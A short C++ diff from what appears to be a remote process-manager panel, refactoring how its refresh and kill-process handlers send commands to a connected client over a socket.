@@ -61,19 +61,13 @@ void panelProcessManager::CrearListview() {
 
 void ListCtrlManager2::OnRefrescar(wxCommandEvent& event) {
 	this->DeleteAllItems();
-	std::string strComando = std::to_string(EnumComandos::PM_Refrescar);
-	strComando.append(1, CMD_DEL);
-	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
-	return;
+	p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::PM_Refrescar);
 }
 
 void ListCtrlManager2::OnTerminarPID(wxCommandEvent& event) {
 	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
-	std::string strComando = std::to_string(EnumComandos::PM_Kill);
-	strComando.append(1, CMD_DEL);
-	strComando += this->GetItemText(item, 0);
-	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
-	return;
+	std::string strComando = this->GetItemText(item, 0);
+	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::PM_Kill);
 }
 
 void ListCtrlManager2::AgregarData(std::string strBuffer, std::string _strPID){
